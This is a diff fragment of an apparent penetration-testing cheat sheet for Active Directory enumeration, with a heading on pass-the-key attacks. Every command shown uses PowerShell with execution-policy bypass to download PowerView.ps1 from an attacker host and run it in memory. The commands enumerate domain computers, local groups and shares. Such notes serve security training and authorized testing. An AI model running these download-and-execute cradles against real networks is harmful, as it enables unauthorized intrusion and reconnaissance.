@@ -49,10 +49,17 @@
 	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetComputer | select 	samaccountname, operatingsystem"
 	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainComputer -Ping "
 ```
+
+- Local Group in the machine 
+```
+	- hostname
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-NetLocalGroup -ComputerName PWVRTJS14.socrome.local"
+```
+
 - SHARED INFO Enumeration
 ```
 	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-DomainShare -Verbose"
-	cd \\fileshare.pentesting.local\FileShare
+	- cd \\fileshare.pentesting.local\FileShare
 ```
 # Overass The Hash / Pass The Key
 
